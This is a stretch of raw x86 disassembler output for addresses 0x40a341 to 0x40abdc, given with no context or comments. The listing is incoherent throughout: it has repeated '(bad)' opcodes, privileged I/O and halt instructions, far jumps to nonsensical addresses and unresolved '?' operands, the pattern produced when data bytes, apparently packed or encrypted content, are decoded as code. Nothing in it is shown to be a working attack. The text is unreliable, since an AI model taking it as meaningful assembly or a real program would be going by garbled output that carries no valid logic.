  40a341:	les    ecx,FWORD PTR [esi+0x10]
  40a344:	mov    WORD PTR [eax+0x77],es
  40a347:	in     al,dx
	...
  40a35c:	(bad)  
  40a35e:	sbb    al,0x57
  40a360:	aas    
  40a361:	mov    ds:0x6f59ff25,al
  40a366:	sbb    esi,DWORD PTR [ebp-0x7c]
  40a369:	shl    DWORD PTR [ecx],cl
  40a36b:	nop
  40a36c:	shr    DWORD PTR [esi-0x7cbe0144],cl
  40a372:	adc    cl,BYTE PTR [esi+ebx*1-0x4b74e661]
  40a379:	inc    ebx
  40a37a:	psubb  mm0,QWORD PTR [edi+0x194690ab]
  40a381:	xor    DWORD PTR [esi],ebx
  40a383:	push   eax
  40a384:	mov    ds:0x21fef608,eax
  40a389:	jae    0x40a39d
  40a38b:	stos   DWORD PTR es:[edi],eax
  40a38c:	xchg   ecx,eax
  40a38d:	outs   dx,BYTE PTR ds:[esi]
  40a38e:	sbb    ecx,DWORD PTR [ecx+0x458977d1]
  40a394:	jl     0x40a351
  40a396:	sbb    DWORD PTR [ebp-0x78],esi
  40a399:	xchg   cx,ax
  40a39b:	pop    es
  40a39c:	fs add al,0x19
  40a39f:	jmp    FWORD PTR [ebx+0x4]
  40a3a2:	shl    edi,0x63
  40a3a5:	enter  0xff1c,0xe1
  40a3a9:	inc    ebx
  40a3aa:	sbb    esi,DWORD PTR [ebp+0x58]
  40a3ad:	cs xchg ecx,eax
  40a3af:	sti    
  40a3b0:	xor    al,0x94
  40a3b2:	lock adc DWORD PTR [ebx+0x7d],eax
  40a3b6:	jnp    0x40a3e3
  40a3b8:	cmp    eax,DWORD PTR [edi]
  40a3ba:	pushf  
  40a3bb:	sbb    edx,DWORD PTR [esi+0x27]
  40a3be:	xchg   DWORD PTR [edx],edx
	...
  40a3d4:	sub    eax,DWORD PTR [edi]
  40a3d6:	mov    BYTE PTR [ebx],bl
  40a3d8:	ds daa 
  40a3da:	ja     0x40a3ee
  40a3dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a3dd:	xchg   esp,eax
  40a3de:	push   ss
  40a3df:	adc    ebx,DWORD PTR [ecx+0x189d878c]
  40a3e5:	jge    0x40a456
  40a3e7:	jle    0x40a3b8
  40a3e9:	fdiv   DWORD PTR [esi-0x207431c4]
  40a3ef:	mov    eax,0x90637006
  40a3f4:	xchg   edi,eax
  40a3f5:	xchg   esi,eax
  40a3f6:	mov    cl,0xe4
  40a3f8:	loop   0x40a400
  40a3fa:	rcl    BYTE PTR [edx],1
  40a3fc:	popa   
  40a3fd:	mov    WORD PTR [edi-0x46],es
  40a400:	add    edi,DWORD PTR [ebp+0x27]
  40a403:	adc    al,BYTE PTR [ecx-0x5c]
  40a406:	cs cwde 
  40a408:	mov    ebp,DWORD PTR [edi+eax*2+0x10]
  40a40c:	mov    ebx,0x83981f7c
  40a411:	jge    0x40a3b0
  40a413:	sti    
  40a414:	mov    bl,0x37
  40a416:	or     eax,0x7d7ca312
  40a41b:	repz call 0xe77d:0x461be806
  40a423:	adc    DWORD PTR [edi],edx
  40a425:	loop   0x40a41a
  40a427:	jp     0x40a3b7
  40a429:	jnp    0x40a488
  40a42b:	hlt    
  40a42c:	jp     0x40a430
  40a42e:	call   0xc7baa94e
  40a433:	adc    DWORD PTR [edi],ecx
  40a435:	cli    
  40a436:	sti    
  40a437:	add    al,0x0
	...
  40a449:	add    BYTE PTR [eax],al
  40a44b:	add    dl,bl
  40a44d:	mov    ds:0x7b8b97b6,al
  40a452:	or     DWORD PTR [eax+edx*2],edi
  40a455:	je     0x40a4c8
  40a457:	lods   al,BYTE PTR ds:[esi]
  40a458:	popf   
  40a459:	jnp    0x40a451
  40a45b:	sbb    al,0x38
  40a45d:	jnp    0x40a4db
  40a45f:	icebp  
  40a460:	xchg   edi,eax
  40a461:	jmp    0x7bde3b59
  40a466:	jl     0x40a461
  40a468:	or     DWORD PTR [ebp+esi*8-0x778bd804],esp
  40a46f:	pop    ecx
  40a470:	jge    0x40a4ed
  40a472:	idiv   ah
  40a474:	pop    ds
  40a475:	jnp    0x40a4f3
  40a477:	loope  0x40a420
  40a479:	xchg   BYTE PTR [esi-0x34b2629a],al
  40a47f:	stc    
  40a480:	(bad)  
  40a481:	loope  0x40a404
  40a483:	inc    ebp
  40a484:	popf   
  40a485:	add    DWORD PTR ds:0x7c7b8ec3,eax
  40a48b:	icebp  
  40a48c:	xchg   esi,esi
  40a48e:	cwde   
  40a48f:	ds jge 0x40a50d
  40a492:	jl     0x40a479
  40a494:	jl     0x40a497
  40a496:	add    DWORD PTR [ecx+0x75],eax
  40a499:	jp     0x40a491
  40a49b:	es inc ecx
  40a49d:	loope  0x40a4b7
  40a49f:	jo     0x40a433
  40a4a1:	jnp    0x40a51f
  40a4a3:	in     eax,0x9c
  40a4a5:	add    DWORD PTR [ecx],eax
  40a4a7:	add    DWORD PTR [ebp+0x7a],esp
  40a4aa:	test   BYTE PTR [esi],0x21
  40a4ad:	loope  0x40a4cb
  40a4af:	jo     0x40a4b1
	...
  40a4c1:	add    BYTE PTR [eax],al
  40a4c3:	add    BYTE PTR [edx+0x7ce57c7b],dl
  40a4c9:	add    DWORD PTR [ecx],eax
  40a4cb:	add    ebp,edx
  40a4cd:	jp     0x40a4c5
  40a4cf:	out    0x0,al
  40a4d1:	loop   0x40a4e3
  40a4d3:	jo     0x40a466
  40a4d5:	dec    ebp
  40a4d6:	retf   
  40a4d7:	std    
  40a4d8:	(bad)  
  40a4d9:	loope  0x40a45c
  40a4db:	mov    ebp,0xe55010
  40a4e0:	cmp    DWORD PTR ds:0x194175f7,0x9
  40a4e7:	call   DWORD PTR [eax-0x1ae61188]
  40a4ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a4ee:	cmc    
  40a4ef:	jmp    DWORD PTR [eax+0x3d75f77c]
  40a4f5:	lahf   
  40a4f6:	or     BYTE PTR [edi-0xf7e5be6],0xc
  40a4fd:	dec    eax
  40a4fe:	or     DWORD PTR [eax],eax
  40a500:	xor    eax,0xa6144bf8
  40a505:	dec    edi
  40a506:	div    BYTE PTR [eax+eiz*1-0x62]
  40a50a:	ds add ebp,esi
  40a50d:	xchg   esi,eax
  40a50e:	int    0x45
  40a510:	imul   edx,DWORD PTR [edi-0x61afff8],0xa435fc4b
  40a51a:	jnp    0x40a530
  40a51c:	pop    edx
  40a51d:	and    al,BYTE PTR [esi]
  40a51f:	jmp    DWORD PTR [eax]
  40a521:	jg     0x40a511
  40a523:	repnz fwait
  40a525:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a526:	cmc    
  40a527:	mov    eax,DWORD PTR [eax]
	...
  40a539:	add    BYTE PTR [eax],al
  40a53b:	add    BYTE PTR [ebp-0x4a038bf0],bl
  40a541:	and    ch,BYTE PTR [ebx]
  40a543:	push   0x4929ea
  40a548:	call   0x915:0xb5e8f222
  40a54f:	add    BYTE PTR [esi-0x2f2842a],ch
  40a555:	or     edx,DWORD PTR [ecx+eax*2-0x5b]
  40a559:	mov    ds:0xa48dfc7b,eax
  40a55e:	mov    BYTE PTR [eax],al
  40a560:	jne    0x40a561
  40a562:	dec    ebx
  40a563:	in     al,dx
  40a564:	pop    esi
  40a565:	xchg   edx,eax
  40a566:	int    0x45
  40a568:	dec    ecx
  40a569:	xchg   ecx,eax
  40a56a:	or     BYTE PTR [eax],al
  40a56c:	mov    WORD PTR [ebx-0x75],gs
  40a56f:	jge    0x40a5e9
  40a571:	ins    BYTE PTR es:[edi],dx
  40a572:	sahf   
  40a573:	pop    ss
  40a574:	hlt    
  40a575:	ins    BYTE PTR es:[edi],dx
  40a576:	or     ch,bh
  40a578:	sbb    bh,BYTE PTR [ebx]
  40a57a:	nop
  40a57b:	or     esp,DWORD PTR [ecx+eiz*2+0x7d]
  40a57f:	dec    DWORD PTR [ebx+0x2b]
  40a582:	nop
  40a583:	sti    
  40a584:	inc    ebx
  40a585:	cdq    
  40a586:	or     al,ch
  40a588:	sar    ah,0x5
  40a58b:	jmp    DWORD PTR ds:0x8c000cf7
  40a591:	idiv   BYTE PTR [edi+0xa540f13]
  40a597:	jne    0x40a52a
  40a599:	and    al,0x8f
  40a59b:	add    BYTE PTR [ebx+ebp*2+0x454f],cl
	...
  40a5b2:	add    BYTE PTR [eax],al
  40a5b4:	add    al,0x6c
  40a5b6:	or     al,BYTE PTR [eax]
  40a5b8:	mov    WORD PTR [edx+0x6b8cf3bf],gs
  40a5be:	or     al,BYTE PTR [eax]
  40a5c0:	retf   
  40a5c1:	sub    BYTE PTR [edx],bl
  40a5c3:	add    BYTE PTR [ebx+ebp*2-0x44b672f6],cl
  40a5ca:	mov    esp,0xbcbf518c
  40a5cf:	mov    WORD PTR [ecx-0x3d],cs
  40a5d2:	mov    esp,0x75f41fe
  40a5d7:	jne    0x40a56d
  40a5d9:	mov    ds:0x9abbfe2b,eax
  40a5de:	mov    DWORD PTR [ebp-0x60],edi
  40a5e1:	imul   ebx,DWORD PTR [esi+0x2090f32],0x0
  40a5e8:	sbb    BYTE PTR [eax-0x75],ah
  40a5eb:	jge    0x40a58d
  40a5ed:	imul   edx,DWORD PTR [ecx+0x1a010f05],0x0
  40a5f4:	add    BYTE PTR [ebp+0x7],cl
  40a5f7:	jne    0x40a57d
  40a5f9:	xchg   esp,eax
  40a5fa:	out    dx,al
  40a5fb:	cwde   
  40a5fc:	xchg   DWORD PTR [ebx+esi*8+0x74],ebp
  40a600:	jae    0x40a67b
  40a602:	fistp  WORD PTR [eax+0x5d795f]
  40a608:	je     0x40a596
  40a60a:	push   eax
  40a60b:	push   cs
  40a60c:	pop    ebx
  40a60d:	jns    0x40a64c
  40a60f:	adc    al,0x53
  40a611:	(bad)  
  40a612:	jmp    0x40a62f
  40a614:	dec    ecx
  40a615:	and    al,0xa7
  40a617:	push   cs
	...
  40a62c:	inc    ebx
  40a62d:	jmp    DWORD PTR [edi-0x68dad1e5]
  40a633:	push   cs
  40a634:	xor    edi,edi
  40a636:	xchg   ebx,eax
  40a637:	sbb    eax,DWORD PTR [esi+0x25]
  40a63a:	xchg   DWORD PTR [esi],ecx
  40a63c:	and    edi,edi
  40a63e:	outs   dx,DWORD PTR ds:[esi]
  40a63f:	sbb    edi,DWORD PTR [esi]
  40a641:	and    eax,0x8dc30e77
  40a646:	jle    0x40a646
  40a648:	adc    bh,ah
  40a64a:	pushw  cs
  40a64c:	add    edx,DWORD PTR ds:0x8c1fed
  40a652:	neg    BYTE PTR [ecx-0x2a860d]
  40a658:	repz in eax,dx
  40a65a:	outs   dx,DWORD PTR ds:[esi]
  40a65b:	push   cs
  40a65c:	jecxz  0x40a64b
  40a65e:	fisttp WORD PTR [esi]
  40a660:	popa   
  40a661:	mov    BYTE PTR [edi-0x5d],dl
  40a664:	add    edi,DWORD PTR [ecx+0x3f]
  40a667:	cdq    
  40a668:	retf   
  40a669:	jns    0x40a628
  40a66b:	jmp    FWORD PTR [ebx-0x44f1901f]
  40a671:	js     0x40a610
  40a673:	shld   DWORD PTR [esi],edx,0x73
  40a677:	push   cs
  40a678:	stos   DWORD PTR es:[edi],eax
  40a679:	leave  
  40a67a:	jmp    0x9b0d:0x4d0f9315
  40a681:	js     0x40a61a
  40a683:	lods   eax,DWORD PTR ds:[esi]
  40a684:	les    edx,FWORD PTR [ebp+0x9]
  40a687:	(bad)  [edi+0xdfd81e1]
  40a68d:	push   ecx
  40a68e:	in     eax,dx
  40a68f:	aas    
	...
  40a6a4:	mov    DWORD PTR [ecx],eax
  40a6a6:	add    ecx,edx
  40a6a8:	and    eax,0xe7d6f60b
  40a6ad:	sar    esp,1
  40a6af:	push   0x13
  40a6b1:	test   BYTE PTR [ecx],bl
  40a6b3:	cmp    dl,BYTE PTR [esi+0x40]
  40a6b6:	or     cl,ch
  40a6b8:	(bad)  
  40a6b9:	xchg   esp,eax
  40a6ba:	push   esi
  40a6bb:	mov    al,ds:0xae088cce
  40a6c0:	sbb    edx,DWORD PTR [eax+0x77bb14e0]
  40a6c6:	mul    BYTE PTR [esi-0x16f77fb5]
  40a6cc:	(bad)  
  40a6cd:	xchg   esp,eax
  40a6ce:	and    DWORD PTR [eax+edx*4],0xffffffe4
  40a6d2:	cmc    
  40a6d3:	cld    
  40a6d4:	pop    ss
  40a6d5:	jo     0x40a6cb
  40a6d7:	ins    BYTE PTR es:[edi],dx
  40a6d8:	xor    DWORD PTR [edi-0x80],0x74139c2c
  40a6df:	jno    0x40a669
  40a6e1:	add    BYTE PTR ds:0xb7c0b6a,al
  40a6e7:	fisttp DWORD PTR [ecx-0x6daa8bed]
  40a6ed:	inc    BYTE PTR [edx]
  40a6ef:	xchg   ecx,eax
  40a6f0:	(bad)  
  40a6f1:	xchg   esp,eax
  40a6f2:	or     cl,ch
  40a6f4:	sub    DWORD PTR [ebp-0x35],ecx
  40a6f7:	icebp  
  40a6f8:	(bad)
  40a6fc:	add    BYTE PTR [edi+0x7c],dh
  40a6ff:	loope  0x40a6a8
  40a701:	bound  eax,QWORD PTR [esi+eiz*1+0x21741389]
	...
  40a71c:	mov    BYTE PTR [eax],al
  40a71e:	or     eax,0x3004fe2
  40a723:	push   ecx
  40a724:	(bad)  
  40a725:	xchg   esp,eax
  40a726:	or     BYTE PTR [eax],al
  40a728:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a729:	sub    ecx,eax
  40a72b:	ret    0x939d
  40a72e:	mov    DWORD PTR [ebp-0x7f],edi
  40a731:	mov    ?,WORD PTR [edx+0x1f]
  40a734:	loopne 0x40a785
  40a736:	(bad)  
  40a737:	push   eax
  40a738:	fild   QWORD PTR [eax-0x9]
  40a73b:	jne    0x40a7ba
  40a73d:	fwait
  40a73e:	mov    es,WORD PTR es:[edx-0x78]
  40a742:	add    DWORD PTR [ebp+0x3d],0x43
  40a746:	div    DWORD PTR [ebp+0x5d]
  40a749:	fwait
  40a74a:	xchg   esi,eax
  40a74b:	lea    edx,[edx]
  40a74d:	mov    BYTE PTR [edi+0x45],bh
  40a750:	pop    ecx
  40a751:	pushf  
  40a752:	adc    ecx,DWORD PTR [ebp-0xa77798]
  40a758:	cwde   
  40a759:	js     0x40a749
  40a75b:	lea    esp,[eax+0x7889f588]
  40a761:	lods   al,BYTE PTR ds:[esi]
  40a762:	add    DWORD PTR [ebp-0x3],0x42
  40a766:	pusha  
  40a767:	add    al,0x12
  40a769:	push   ds
  40a76a:	push   cs
  40a76b:	call   0x36a095
  40a770:	jo     0x40a7c0
  40a772:	(bad)  
  40a773:	push   eax
  40a774:	jb     0x40a794
  40a776:	push   cs
  40a777:	call   0x363532
  40a77c:	pushw  es
  40a77e:	jmp    0x0:0x1
	...
  40a791:	add    BYTE PTR [eax],al
  40a793:	add    al,cl
  40a795:	push   0x433d4585
  40a79a:	div    DWORD PTR [ebp+0x51]
  40a79d:	mov    BYTE PTR [ebx+0xc],bh
  40a7a0:	xchg   edx,eax
  40a7a1:	push   ds
  40a7a2:	push   cs
  40a7a3:	call   0x362dbb
  40a7a8:	pusha  
  40a7a9:	dec    esi
  40a7aa:	(bad)  
  40a7ab:	push   eax
  40a7ac:	jb     0x40a7cc
  40a7ae:	push   cs
  40a7af:	call   0x3634f6
  40a7b4:	mov    edx,gs
  40a7b6:	xchg   bh,dh
  40a7b8:	mov    WORD PTR [eax],fs
  40a7ba:	lock mov bh,0x8c
  40a7bd:	ins    DWORD PTR es:[edi],dx
  40a7be:	or     al,BYTE PTR [eax]
  40a7c0:	xor    al,ah
  40a7c2:	inc    edi
  40a7c3:	or     BYTE PTR [eax+esi*8+0x66dcf7ce],cl
  40a7ca:	pushf  
  40a7cb:	sti    
  40a7cc:	jnp    0x40a7a7
  40a7ce:	lock (bad) 
  40a7d0:	stc    
  40a7d1:	adc    DWORD PTR [edx],0xffffff80
  40a7d4:	imul   ebx,DWORD PTR [edi+0x2],0xd63e183
  40a7db:	jne    0x40a763
  40a7dd:	adc    ecx,DWORD PTR ds:0xa06b8c00
  40a7e3:	enter  0x744e,0xa
  40a7e7:	(bad)  
  40a7e8:	leave  
  40a7e9:	inc    ebx
  40a7ea:	mov    ebp,0x1283c1fe
  40a7ef:	push   cs
  40a7f0:	add    DWORD PTR [edi],edx
  40a7f2:	add    cl,BYTE PTR [ebx+0x6151c]
	...
  40a80c:	mov    WORD PTR [ebx+0x3],gs
  40a80f:	jne    0x40a795
  40a811:	and    eax,DWORD PTR [eax-0x72]
  40a814:	adc    esi,edi
  40a816:	lds    eax,FWORD PTR [eax+eax*1+0x79]
  40a81a:	or     ecx,ebp
  40a81c:	sti    
  40a81d:	imul   ecx,DWORD PTR [edx],0x0
  40a820:	(bad)  
  40a822:	push   cs
  40a823:	push   es
  40a824:	jle    0x40a7b5
  40a826:	outs   dx,DWORD PTR ds:[esi]
  40a827:	inc    ebp
  40a828:	in     al,0x3b
  40a82a:	add    esi,DWORD PTR [ebp-0x6c]
  40a82d:	shr    DWORD PTR ds:0x6fcedb8c,cl
  40a833:	inc    ebp
  40a834:	aam    0x1b
  40a836:	add    esi,DWORD PTR [ebp-0x6c]
  40a839:	rol    esi,cl
  40a83b:	stc    
  40a83c:	ret    
  40a83d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a83e:	outs   dx,DWORD PTR ds:[esi]
  40a83f:	inc    ebp
  40a840:	mov    ah,0x94
  40a842:	scas   eax,DWORD PTR es:[edi]
  40a843:	or     bh,BYTE PTR [ecx]
  40a845:	mov    WORD PTR [edi],ss
  40a847:	fisub  DWORD PTR [ebp+0x49791f75]
  40a84d:	jl     0x40a7ff
  40a84f:	or     ah,BYTE PTR [ecx]
  40a851:	mov    WORD PTR [edi],ss
  40a853:	aaa    
  40a854:	xchg   edi,eax
  40a855:	jne    0x40a84e
  40a857:	jl     0x40a82a
  40a859:	test   BYTE PTR [ebp-0x3f],ch
  40a85c:	jnp    0x40a842
  40a85e:	out    0x90,al
  40a860:	xchg   ebx,eax
  40a861:	ins    BYTE PTR es:[edi],dx
  40a862:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a863:	push   cs
  40a864:	jae    0x40a8db
  40a866:	jns    0x40a828
  40a868:	ja     0x40a871
  40a86a:	and    eax,0x5d75bc0c
  40a86f:	cld    
	...
  40a884:	jae    0x40a8c5
  40a886:	retf   
  40a887:	or     dl,BYTE PTR [ebx+0xb]
  40a88a:	sub    eax,0xaff70f1c
  40a88f:	add    edi,DWORD PTR [eax+0x27886301]
  40a895:	xchg   esp,eax
  40a896:	adc    ebx,DWORD PTR [ecx+0x397f70e]
  40a89c:	mov    al,ds:0x1b8862ed
  40a8a1:	xchg   esp,eax
  40a8a2:	sbb    esp,DWORD PTR [ebp-0x3ad2db4d]
  40a8a8:	adc    esi,DWORD PTR [esi-0x3]
  40a8ab:	adc    esi,esp
  40a8ad:	sar    ch,cl
  40a8af:	add    ecx,DWORD PTR [ecx+ecx*4-0x13666f61]
  40a8b6:	out    dx,al
  40a8b7:	test   al,0x4c
  40a8b9:	xchg   esp,eax
  40a8ba:	push   esi
  40a8bb:	nop
  40a8bc:	sti    
  40a8bd:	imul   edx,DWORD PTR [eax],0xffffff8a
  40a8c0:	jecxz  0x40a936
  40a8c2:	jmp    0x40a907
  40a8c4:	popa   
  40a8c5:	xchg   edi,edx
  40a8c7:	xor    BYTE PTR [ecx],0xd3
  40a8ca:	fisttp WORD PTR [edx]
  40a8cc:	inc    ecx
  40a8cd:	test   BYTE PTR [ecx],cl
  40a8cf:	inc    ecx
  40a8d0:	mov    dh,0xf6
  40a8d2:	or     cl,ch
  40a8d4:	mov    edx,0x17d77d34
  40a8d9:	jne    0x40a8d1
  40a8db:	push   cs
  40a8dc:	push   ebp
  40a8dd:	jne    0x40a95b
  40a8df:	in     eax,0x87
  40a8e1:	leave  
  40a8e2:	xchg   BYTE PTR [esi],cl
  40a8e4:	xchg   BYTE PTR [ebp+0x7c],dh
  40a8e7:	stc    
	...
  40a8fc:	test   edi,edi
  40a8fe:	add    al,0x11
  40a900:	icebp  
  40a901:	and    dh,dh
  40a903:	not    BYTE PTR [ebp+0xbeee4e9]
  40a909:	mov    al,ds:0x73f67ee0
  40a90e:	neg    dh
  40a910:	sbb    edi,DWORD PTR [esi+esi*8+0x5c]
  40a914:	fs jl  0x40a89c
  40a917:	pop    edi
  40a918:	test   DWORD PTR [ebx-0xa],esi
  40a91b:	cmp    al,0x78
  40a91d:	jl     0x40a997
  40a91f:	pop    eax
  40a920:	xchg   ebp,eax
  40a921:	jae    0x40a919
  40a923:	cmp    al,0xa4
  40a925:	jl     0x40a987
  40a927:	pop    eax
  40a928:	test   DWORD PTR [ebx-0xa],esi
  40a92b:	sbb    al,0x90
  40a92d:	jl     0x40a997
  40a92f:	js     0x40a8c6
  40a931:	jae    0x40a97a
  40a933:	push   0xb
  40a935:	ins    BYTE PTR es:[edi],dx
  40a936:	or     DWORD PTR ds:0xf6fe9f18,edx
  40a93c:	xchg   edx,eax
  40a93d:	imul   esi,edi,0x7e
  40a940:	xchg   ebp,eax
  40a941:	pop    ds
  40a942:	dec    esp
  40a943:	jno    0x40a97b
  40a945:	pop    ebp
  40a946:	retf   
  40a947:	loope  0x40a8d8
  40a949:	leave  
  40a94a:	adc    DWORD PTR [ebp+0x9],0x1b5ef559
  40a951:	mov    al,ds:0x7357f5e0
  40a956:	mul    dl
  40a958:	dec    edi
  40a959:	jmp    0x3398a983
  40a95e:	repnz push eax
	...
  40a974:	pop    ebp
  40a975:	in     eax,dx
  40a976:	cmp    bh,0x7a
  40a979:	popf   
  40a97a:	jnp    0x40a978
  40a97c:	push   0x23
  40a97e:	add    ch,al
  40a980:	es repnz cmc 
  40a983:	call   FWORD PTR [esi+0x7a0f7cd7]
  40a989:	and    ecx,DWORD PTR [esi]
  40a98b:	inc    DWORD PTR [eax]
  40a98d:	pushf  
  40a98e:	loopne 0x40a917
  40a990:	mov    BYTE PTR [ebp+0x23b50bf5],bl
  40a996:	idiv   dh
  40a998:	add    BYTE PTR [eax+eiz*8-0xa621278],bl
  40a99f:	leave  
  40a9a0:	daa    
  40a9a1:	outs   dx,DWORD PTR ds:[esi]
  40a9a2:	not    BYTE PTR [esi+ebx*8-0x75]
  40a9a6:	xchg   esp,eax
  40a9a8:	add    DWORD PTR [ebp-0xdcd000b],ebx
  40a9ae:	mov    al,0xfe
  40a9b0:	dec    edx
  40a9b1:	pushf  
  40a9b2:	or     BYTE PTR [eax],al
  40a9b4:	xor    eax,0x29458197
  40a9b9:	jo     0x40a971
  40a9bb:	je     0x40a9ed
  40a9bd:	pop    ss
  40a9be:	xor    DWORD PTR [eax],eax
  40a9c0:	nop
  40a9c1:	jae    0x40a9a4
  40a9c3:	push   ecx
  40a9c4:	xor    al,0x97
  40a9c6:	or     bh,bh
  40a9c8:	sub    BYTE PTR [esi+ebp*8+0x29],0xa9
  40a9cd:	pushf  
  40a9ce:	cmc    
  40a9cf:	or     esp,ebp
  40a9d1:	and    DWORD PTR [edi],eax
  40a9d3:	push   0x492c86
	...
  40a9ec:	jp     0x40aa10
  40a9ee:	add    ch,al
  40a9f0:	xchg   edx,eax
  40a9f1:	in     al,0xf5
  40a9f3:	call   FWORD PTR [esi+0x6a]
  40a9f6:	outs   dx,BYTE PTR ds:[esi]
  40a9f7:	clc    
  40a9f8:	cmp    dl,BYTE PTR [esi-0xa]
  40a9fb:	dec    BYTE PTR [eax+edx*2-0x16cb1802]
  40aa02:	add    bh,bh
  40aa04:	add    eax,0xcbfe4200
  40aa09:	mov    cl,0x91
  40aa0b:	cmp    eax,0x8d0a7d8d
  40aa10:	adc    DWORD PTR [edi+0x2cb3feff],edi
  40aa16:	adc    dl,al
  40aa18:	cld    
  40aa19:	xchg   ecx,eax
  40aa1a:	add    BYTE PTR [ebp-0x10040f7],cl
  40aa20:	fwait
  40aa21:	sub    al,0x1
  40aa23:	mov    ch,0xd4
  40aa25:	call   0xff8e:0x7e74ff00
  40aa2c:	xor    ebp,0x76
  40aa2f:	mov    esp,0x400e837a
  40aa34:	cmp    edi,0x19
  40aa37:	add    BYTE PTR [ebx+edi*2+0x4a4e9571],cl
  40aa3e:	push   cs
  40aa3f:	jmp    DWORD PTR [ebx+0x7e]
  40aa42:	cli    
  40aa43:	call   DWORD PTR [ebx+0x7c]
  40aa46:	xchg   BYTE PTR [ecx+ebx*1-0x42],bh
  40aa4a:	ror    BYTE PTR [edi-0x4c],1
  40aa4d:	pop    ecx
  40aa4e:	mov    esi,0x40
	...
  40aa63:	add    BYTE PTR [ebx+edx*2+0x7b8c7b2e],cl
  40aa6a:	repz mov edi,0xa91578a1
  40aa70:	mov    WORD PTR [ebx+0xa],?
  40aa73:	lea    eax,[ecx]
  40aa75:	ud0    edx,DWORD PTR ds:[ebx]
  40aa79:	jmp    0x839cd648
  40aa7e:	sbb    al,0x4f
  40aa80:	dec    ebp
  40aa81:	jnp    0x40aa95
  40aa83:	ret    0x7b77
  40aa86:	or     cl,BYTE PTR [ebx]
  40aa88:	int3   
  40aa89:	xchg   esp,eax
  40aa8a:	aam    0x0
  40aa8c:	cmc    
  40aa8d:	and    al,ah
  40aa8f:	add    ecx,DWORD PTR [ecx+esi*2+0x1bf3f7d5]
  40aa96:	jnp    0x40aa9f
  40aa98:	rcr    DWORD PTR [ebp-0x3656ee1],cl
  40aa9e:	xchg   BYTE PTR [esp+ecx*2-0x786ec16c],bh
  40aaa5:	jl     0x40aad6
  40aaa7:	jae    0x40aa5c
  40aaa9:	jno    0x40aac6
  40aaab:	cli    
  40aaac:	xor    eax,0x97911694
  40aab1:	jl     0x40ab0e
  40aab3:	jae    0x40aa50
  40aab5:	jno    0x40ab0c
  40aab7:	jno    0x40aa87
  40aab9:	jb     0x40aaca
  40aabb:	pop    es
  40aabc:	sbb    esi,eax
  40aabe:	ret    
  40aabf:	mov    cl,0xd3
  40aac1:	jl     0x40aac2
  40aac3:	jb     0x40ab40
  40aac5:	jno    0x40aa57
  40aac7:	push   es
	...
  40aadc:	stc    
  40aadd:	test   BYTE PTR [edi],ch
  40aadf:	pop    es
  40aae0:	loope  0x40aa7e
  40aae2:	xlat   BYTE PTR ds:[ebx]
  40aae3:	or     DWORD PTR [edx+0x71],esp
  40aae6:	fistp  WORD PTR [ebx]
  40aae8:	push   esi
  40aae9:	and    edi,eax
  40aaeb:	push   es
  40aaec:	addr16 aad 0x7c
  40aaef:	shl    DWORD PTR [edi+0x1b],0x6d
  40aaf3:	dec    edi
  40aaf4:	inc    edx
  40aaf5:	jno    0x40aab6
  40aaf7:	push   es
  40aaf8:	rol    DWORD PTR [esi+eiz*4-0x508e07b0],0x6
  40ab00:	xor    al,0xc7
  40ab02:	adc    eax,DWORD PTR [esp+ecx*4]
  40ab05:	popf   
  40ab06:	lahf   
  40ab07:	(bad)  
  40ab08:	jae    0x40ab06
  40ab0a:	ss mov ebx,0x908e94cc
  40ab10:	xchg   edi,eax
  40ab11:	jl     0x40ab1a
  40ab13:	jae    0x40ab18
  40ab15:	jno    0x40ab20
  40ab17:	jbe    0x40ab75
  40ab19:	sub    bh,dh
  40ab1b:	outs   dx,BYTE PTR ds:[esi]
  40ab1c:	mov    al,ah
  40ab1e:	loopne 0x40aabe
  40ab20:	pop    esi
  40ab21:	jno    0x40ab19
  40ab23:	mov    ecx,0xe17c721f
  40ab28:	ja     0x40ab0e
  40ab2a:	test   BYTE PTR [esi-0x76],0x7c
  40ab2e:	mov    esp,0x84719276
  40ab33:	fs dec ebp
  40ab35:	jb     0x40ab2d
  40ab37:	push   DWORD PTR ss:[ecx-0x44]
  40ab3b:	ins    DWORD PTR es:[edi],dx
  40ab3c:	mov    DWORD PTR [ecx-0xa],esi
  40ab3f:	adc    DWORD PTR [eax],eax
	...
  40ab51:	add    BYTE PTR [eax],al
  40ab53:	add    BYTE PTR [eax+0xce908ed],dh
  40ab59:	push   esp
  40ab5a:	push   es
  40ab5b:	ins    BYTE PTR es:[edi],dx
  40ab5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ab5d:	jno    0x40ab55
  40ab5f:	push   cs
  40ab60:	mov    ah,BYTE PTR [edi]
  40ab62:	mov    ch,0x7
  40ab64:	xchg   edx,eax
  40ab65:	outs   dx,DWORD PTR ds:[esi]
  40ab66:	loope  0x40ab3d
  40ab68:	push   ss
  40ab69:	jo     0x40ab61
  40ab6b:	test   bl,0x2c
  40ab6e:	imul   esi
  40ab70:	mov    DWORD PTR [esp+ecx*4+0x76],edi
  40ab74:	xchg   ecx,eax
  40ab75:	outs   dx,DWORD PTR ds:[esi]
  40ab76:	shr    BYTE PTR [ebx+0x625d7064],0x74
  40ab7d:	adc    eax,0x6f8a99cd
  40ab82:	imul   BYTE PTR [esi-0x4108d335]
  40ab88:	mov    DWORD PTR [eax+ecx*1+0x4c1b8fe9],edx
  40ab8f:	fnsave [eax+esi*1]
  40ab92:	jge    0x40ab80
  40ab94:	shrd   DWORD PTR [eax],ecx,cl
  40ab97:	adc    al,0x23
  40ab99:	jge    0x40ab9b
  40ab9b:	call   0x9aa1402f
  40aba0:	(bad)  
  40aba2:	or     BYTE PTR [eax],al
  40aba4:	adc    ah,BYTE PTR [eax]
  40aba6:	add    ch,al
  40aba8:	adc    ah,bl
  40abaa:	cmc    
  40abab:	jmp    FWORD PTR [edi+ebp*8-0x50]
  40abaf:	(bad)  
  40abb0:	bound  ebx,QWORD PTR [ecx-0x6c0bc1a0]
  40abb6:	or     BYTE PTR [ebp+0x0],cl
	...
  40abcc:	push   0x42fff6d2
  40abd1:	sub    dh,ch
  40abd3:	xor    bl,BYTE PTR [bx+di-0x720b]
  40abd8:	cmp    dl,dl
  40abda:	idiv   bh
  40abdc:	sub    BYTE PTR [eax],0xf7
